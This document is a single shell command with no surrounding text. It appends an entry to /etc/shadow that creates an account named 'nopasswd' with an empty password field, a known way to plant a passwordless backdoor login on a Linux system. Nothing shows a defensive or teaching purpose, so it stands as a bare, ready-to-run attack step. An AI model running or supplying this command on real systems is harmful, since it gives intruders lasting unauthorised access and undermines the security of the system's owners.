echo 'nopasswd::16659:0:99999:7:::' >> /etc/shadow
